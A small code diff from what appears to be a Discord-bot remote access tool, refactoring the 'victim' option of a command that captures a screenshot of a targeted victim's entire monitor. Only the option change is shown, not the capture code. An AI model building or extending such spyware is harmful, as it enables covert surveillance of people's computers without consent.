@@ -12,9 +12,7 @@ class GetScreenshot(commands.Cog):
         
     @commands.slash_command(
         description="Sends screenshot of entire monitor",
-        options=[
-            discord.Option("victim", description="IP Address of specific victim", required=True),
-        ],
+        options=[self.bot.victim],
     )
     async def get_screenshot(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
